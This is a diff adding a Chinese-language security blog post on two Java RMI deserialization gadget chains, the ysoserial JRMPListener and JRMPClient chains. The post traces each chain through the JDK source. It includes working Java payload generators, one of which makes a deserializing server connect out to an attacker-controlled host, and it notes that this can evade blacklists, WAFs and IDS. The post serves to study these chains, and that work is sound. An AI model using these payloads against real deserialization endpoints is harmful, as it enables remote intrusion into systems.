@@ -1,0 +1,370 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="前言好久不见，在“RMI 反序列化 Attack”一文，最后说到要去记录一下 RMI 引出的 Gadgets 以及 JEP 290 的绕过方式，它来了。这篇文章先来记录一下 RMI 引出的两条 Gadgets。 第一条这一条 Gadget 说白了就是利用一个反序列化的入口点去新开启了一个 RMI 的 Server 端，后续可以使用之前提到的攻击 Server 端的方式去打它，也就是 Ysoseri">
+<meta property="og:type" content="article">
+<meta property="og:title" content="记录 RMI 引出的 Gadgets">
+<meta property="og:url" content="http://example.com/2025/11/23/%E8%AE%B0%E5%BD%95-RMI-%E5%BC%95%E5%87%BA%E7%9A%84-Gadgets/index.html">
+<meta property="og:site_name" content="Oystr&#39;s Blog">
+<meta property="og:description" content="前言好久不见，在“RMI 反序列化 Attack”一文，最后说到要去记录一下 RMI 引出的 Gadgets 以及 JEP 290 的绕过方式，它来了。这篇文章先来记录一下 RMI 引出的两条 Gadgets。 第一条这一条 Gadget 说白了就是利用一个反序列化的入口点去新开启了一个 RMI 的 Server 端，后续可以使用之前提到的攻击 Server 端的方式去打它，也就是 Ysoseri">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://oyst3r-blog.oss-cn-beijing.aliyuncs.com/images/2025/12/01/1764559775.png">
+<meta property="og:image" content="https://oyst3r-blog.oss-cn-beijing.aliyuncs.com/images/2025/12/01/1764559788.png">
+<meta property="og:image" content="https://oyst3r-blog.oss-cn-beijing.aliyuncs.com/images/2025/12/01/1764559794.png">
+<meta property="og:image" content="https://oyst3r-blog.oss-cn-beijing.aliyuncs.com/images/2025/12/01/1764559804.png">
+<meta property="og:image" content="https://oyst3r-blog.oss-cn-beijing.aliyuncs.com/images/2025/12/01/1764559816.png">
+<meta property="og:image" content="https://oyst3r-blog.oss-cn-beijing.aliyuncs.com/images/2025/12/01/1764559822.png">
+<meta property="og:image" content="https://oyst3r-blog.oss-cn-beijing.aliyuncs.com/images/2025/12/01/1764559827.png">
+<meta property="og:image" content="https://oyst3r-blog.oss-cn-beijing.aliyuncs.com/images/2025/12/01/1764559837.png">
+<meta property="og:image" content="https://oyst3r-blog.oss-cn-beijing.aliyuncs.com/images/2025/12/01/1764559843.png">
+<meta property="og:image" content="https://oyst3r-blog.oss-cn-beijing.aliyuncs.com/images/2025/12/01/1764559849.png">
+<meta property="og:image" content="https://oyst3r-blog.oss-cn-beijing.aliyuncs.com/images/2025/12/01/1764559952.png">
+<meta property="og:image" content="https://oyst3r-blog.oss-cn-beijing.aliyuncs.com/images/2025/12/01/1764559961.png">
+<meta property="og:image" content="https://oyst3r-blog.oss-cn-beijing.aliyuncs.com/images/2025/12/01/1764559971.png">
+<meta property="og:image" content="https://oyst3r-blog.oss-cn-beijing.aliyuncs.com/images/2025/12/01/1764559980.png">
+<meta property="og:image" content="https://oyst3r-blog.oss-cn-beijing.aliyuncs.com/images/2025/12/01/1764559986.png">
+<meta property="article:published_time" content="2025-11-23T02:57:39.000Z">
+<meta property="article:modified_time" content="2025-12-01T03:39:29.824Z">
+<meta property="article:author" content="Oyst3r">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://oyst3r-blog.oss-cn-beijing.aliyuncs.com/images/2025/12/01/1764559775.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>记录 RMI 引出的 Gadgets</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2025/11/26/Bypass-JEP-290/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/11/23/%E8%AE%B0%E5%BD%95-RMI-%E5%BC%95%E5%87%BA%E7%9A%84-Gadgets/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/11/23/%E8%AE%B0%E5%BD%95-RMI-%E5%BC%95%E5%87%BA%E7%9A%84-Gadgets/&text=记录 RMI 引出的 Gadgets"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/11/23/%E8%AE%B0%E5%BD%95-RMI-%E5%BC%95%E5%87%BA%E7%9A%84-Gadgets/&title=记录 RMI 引出的 Gadgets"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/11/23/%E8%AE%B0%E5%BD%95-RMI-%E5%BC%95%E5%87%BA%E7%9A%84-Gadgets/&is_video=false&description=记录 RMI 引出的 Gadgets"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=记录 RMI 引出的 Gadgets&body=Check out this article: http://example.com/2025/11/23/%E8%AE%B0%E5%BD%95-RMI-%E5%BC%95%E5%87%BA%E7%9A%84-Gadgets/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/11/23/%E8%AE%B0%E5%BD%95-RMI-%E5%BC%95%E5%87%BA%E7%9A%84-Gadgets/&title=记录 RMI 引出的 Gadgets"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/11/23/%E8%AE%B0%E5%BD%95-RMI-%E5%BC%95%E5%87%BA%E7%9A%84-Gadgets/&title=记录 RMI 引出的 Gadgets"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/11/23/%E8%AE%B0%E5%BD%95-RMI-%E5%BC%95%E5%87%BA%E7%9A%84-Gadgets/&title=记录 RMI 引出的 Gadgets"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/11/23/%E8%AE%B0%E5%BD%95-RMI-%E5%BC%95%E5%87%BA%E7%9A%84-Gadgets/&title=记录 RMI 引出的 Gadgets"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/11/23/%E8%AE%B0%E5%BD%95-RMI-%E5%BC%95%E5%87%BA%E7%9A%84-Gadgets/&name=记录 RMI 引出的 Gadgets&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/11/23/%E8%AE%B0%E5%BD%95-RMI-%E5%BC%95%E5%87%BA%E7%9A%84-Gadgets/&t=记录 RMI 引出的 Gadgets"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%9D%A1"><span class="toc-number">2.</span> <span class="toc-text">第一条</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%9D%A1"><span class="toc-number">3.</span> <span class="toc-text">第二条</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        记录 RMI 引出的 Gadgets
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Oyst3r</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-11-23T02:57:39.000Z" class="dt-published" itemprop="datePublished">2025-11-23</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/Java-Security/">Java Security</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>好久不见，在“RMI 反序列化 Attack”一文，最后说到要去记录一下 RMI 引出的 Gadgets 以及 JEP 290 的绕过方式，它来了。这篇文章先来记录一下 RMI 引出的两条 Gadgets。</p>
+<h2 id="第一条"><a href="#第一条" class="headerlink" title="第一条"></a>第一条</h2><p>这一条 Gadget 说白了就是利用一个反序列化的入口点去新开启了一个 RMI 的 Server 端，后续可以使用之前提到的攻击 Server 端的方式去打它，也就是 Ysoserial 中 ysoserial.exploit.JRMPClient 这个 Payload。</p>
+<p>既然是去新开启了一个 RMI 的 Server 端，也就是对应着之前文章中看到的这一行代码：<code>HelloRemoteObject helloRemoteObject = new HelloRemoteObject();</code>，其中具体每一步的实现早就跟过了，这里不在赘述，将里面最关键的一个断点记录如下–&gt;</p>
+<p><img src="https://oyst3r-blog.oss-cn-beijing.aliyuncs.com/images/2025/12/01/1764559775.png" alt="记录 RMI 引出的 Gadgets-01"></p>
+<p>从上图的代码往后开始，就是一路到 UnicastServerRef 类的 exportObject 方法、创建 stub（ServerStubs）、启动 socket、发布 Target等一套标准的创建 Server 端的流程。那就从上图中的代码再向上跟，看看是否可以跟到一个 readObject，一层一层去查看它的方法调用–&gt;</p>
+<p><img src="https://oyst3r-blog.oss-cn-beijing.aliyuncs.com/images/2025/12/01/1764559788.png" alt="记录 RMI 引出的 Gadgets-02"></p>
+<p>然后再看<code>public static Remote exportObject(Remote obj, int port)</code>的方法调用–&gt;</p>
+<p><img src="https://oyst3r-blog.oss-cn-beijing.aliyuncs.com/images/2025/12/01/1764559794.png" alt="记录 RMI 引出的 Gadgets-03"></p>
+<p>再看<code>private void reexport() throws RemoteException</code>的方法调用–&gt;</p>
+<p><img src="https://oyst3r-blog.oss-cn-beijing.aliyuncs.com/images/2025/12/01/1764559804.png" alt="记录 RMI 引出的 Gadgets-04"></p>
+<p>最后成功的跟到了一处 readObject，整条链子就已经 END 了，其实只需要反射去调用 UnicastRemoteObject 类的构造方法这一步即可，去写一个 Demo 如下–&gt;</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JRMPListenerPayload</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">9999</span>;</span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;java.rmi.server.UnicastRemoteObject&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; ctor = clazz.getDeclaredConstructor(<span class="type">int</span>.class);</span><br><span class="line">        ctor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> ctor.newInstance(port);</span><br><span class="line">        serializeObject(instance);</span><br><span class="line">        unSerializeObject(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serializeObject</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        outputStream.writeObject(obj);</span><br><span class="line">        outputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unSerializeObject</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="keyword">return</span> inputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>切换到 JDK 8u65 这样一个低版本后运行（因为高版本在 RegistryImpl 类和 DGCImpl 类中加入了过滤机制，也就是 JEP 290，会导致攻击失败），成功在本地开启了 9999 端口，如下–&gt;</p>
+<p><img src="https://oyst3r-blog.oss-cn-beijing.aliyuncs.com/images/2025/12/01/1764559816.png" alt="记录 RMI 引出的 Gadgets-05"></p>
+<p>后续使用 ysoserial.exploit.JRMPClient 这个 Payload 尝试攻击此端口–&gt;</p>
+<p><img src="https://oyst3r-blog.oss-cn-beijing.aliyuncs.com/images/2025/12/01/1764559822.png" alt="记录 RMI 引出的 Gadgets-06"></p>
+<p>成功触发 DNS 请求，如下–&gt;</p>
+<p><img src="https://oyst3r-blog.oss-cn-beijing.aliyuncs.com/images/2025/12/01/1764559827.png" alt="记录 RMI 引出的 Gadgets-07"></p>
+<p>这个链⛓️‍💥其实就是 Ysoserial 中 ysoserial.payloads.JRMPListener 这个 gadget，可以结合 ysoserial.exploit.JRMPClient 这个 Payload 去发起攻击。它在某些情况下是可以规避一些黑名单的限制，绕过 WAF、IDS等。</p>
+<h2 id="第二条"><a href="#第二条" class="headerlink" title="第二条"></a>第二条</h2><p>而这一条 Gadget 相当于利用一个反序列化点，可以使得服务器主动对外发起一次类似于 RMI Client 端的请求，那就可以伪造一个 Server、Rigister、DGC 去打客户端的 StreamRemoteCall.executeCall(xxx)。</p>
+<p>既然是要去伪造一个 Client 端，那肯定就是要去找创建 Stub 相关的逻辑，然后一层层向上跟，看看有没有能到 readObject 的，其实和上面第一条 Gadget 都是一个挖掘逻辑。这里 Ysoserial 的作者选择了去看 DGCImpl_Stub，Sink 是选择了它的 dirty 方法，如下–&gt;</p>
+<p><img src="https://oyst3r-blog.oss-cn-beijing.aliyuncs.com/images/2025/12/01/1764559837.png" alt="记录 RMI 引出的 Gadgets-08"></p>
+<p>那好，查看它的方法调用，只有一处–&gt;</p>
+<p><img src="https://oyst3r-blog.oss-cn-beijing.aliyuncs.com/images/2025/12/01/1764559843.png" alt="记录 RMI 引出的 Gadgets-09"></p>
+<p>再去跟<code>private void makeDirtyCall(Set&lt;RefEntry&gt; refEntries, long sequenceNum)</code>的方法调用，如下–&gt;</p>
+<p><img src="https://oyst3r-blog.oss-cn-beijing.aliyuncs.com/images/2025/12/01/1764559849.png" alt="记录 RMI 引出的 Gadgets-10"></p>
+<p>有两处调用，其中下面那处顾名思义是清理后台线程相关的代码，不关注，选择上面<code>public boolean registerRefs(List&lt;LiveRef&gt; refs)</code>这一处代码继续向上跟–&gt;</p>
+<p><img src="https://oyst3r-blog.oss-cn-beijing.aliyuncs.com/images/2025/12/01/1764559952.png" alt="记录 RMI 引出的 Gadgets-11"></p>
+<p>也是只有一处去调用，那么再去跟<code>static void registerRefs(Endpoint ep, List&lt;LiveRef&gt; refs)</code>的方法调用，如下–&gt;</p>
+<p><img src="https://oyst3r-blog.oss-cn-beijing.aliyuncs.com/images/2025/12/01/1764559961.png" alt="记录 RMI 引出的 Gadgets-12"></p>
+<p>一共有两处调用，记得组长是走的第一处，而 Ysoserial 的作者是走的第二处，跟一下第二处<code>public static LiveRef read(ObjectInput in, boolean useNewFormat)</code>的方法调用情况–&gt;</p>
+<p><img src="https://oyst3r-blog.oss-cn-beijing.aliyuncs.com/images/2025/12/01/1764559971.png" alt="记录 RMI 引出的 Gadgets-13"></p>
+<p>成功的走到了 readExternal！sun.rmi.server.UnicastRef 类实现了 Externalizable 接口，因此在其反序列化时，会调用其 readExternal 方法执行额外的逻辑。</p>
+<p><font color="#76923c">Tips：这里可以举个例子：</font></p>
+<p>新建一个 Demo 类如下–&gt;</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> <span class="keyword">implements</span> <span class="title class_">Externalizable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Demo</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">writeExternal</span><span class="params">(ObjectOutput out)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">// 空实现</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">readExternal</span><span class="params">(ObjectInput in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;readExternal executed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;readObject executed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>新建测试类如下–&gt;</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DemoTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bos);</span><br><span class="line"></span><br><span class="line">        oos.writeObject(<span class="keyword">new</span> <span class="title class_">Demo</span>());</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bos.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bis);</span><br><span class="line"></span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>运行测试类，结果如下–&gt;</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readExternal executed!</span><br></pre></td></tr></table></figure>
+
+<p>即想说明当某个类实现了 Externalizable 接口，当通过 readObject() 进行反序列化时，JVM 会调用该类的无参构造方法后，自动调用其 readExternal()。</p>
+<p>那么整条链就通了，由于 UnicastRef 的构造函数是 Public 的，那么写法也更简单了，都不需要使用到反射，给出 Demo 如下–&gt;</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.LiveRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ObjID;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JRMPClientPayload</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> <span class="string">&quot;xxx.xxx.xxx.xxx&quot;</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">1099</span>;</span><br><span class="line">        <span class="type">ObjID</span> <span class="variable">id</span>  <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt());</span><br><span class="line">        <span class="type">TCPEndpoint</span> <span class="variable">te</span>  <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(host, port);</span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(id, te, <span class="literal">false</span>));</span><br><span class="line">        serializeObject(ref);</span><br><span class="line">        unSerializeObject(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serializeObject</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        outputStream.writeObject(obj);</span><br><span class="line">        outputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unSerializeObject</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="keyword">return</span> inputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>接着去伪造一个 Server 端，直接用 Ysoserial 中 ysoserial.exploit.JRMPListener 这个 Payload 就好，之前记录过，这里不再赘述。开启后，运行上面的 Demo，1099 端口成功收到请求如下–&gt;</p>
+<p><img src="https://oyst3r-blog.oss-cn-beijing.aliyuncs.com/images/2025/12/01/1764559980.png" alt="记录 RMI 引出的 Gadgets-14"></p>
+<p>此时也成功触发 DNS 请求，如下–&gt;</p>
+<p><img src="https://oyst3r-blog.oss-cn-beijing.aliyuncs.com/images/2025/12/01/1764559986.png" alt="记录 RMI 引出的 Gadgets-15"></p>
+<p>这第二条链其实就是 Ysoserial 中 ysoserial.payloads.JRMPClient 这个 gadget，可以结合 ysoserial.exploit.JRMPListener 这个 Payload 去发起攻击。是很重要的一条链，不管是之后的 Bypass JEP 290 还是 Shiro 的二次反序列化等场景都会见到它的身影。</p>
+<p>记录到此结束！</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
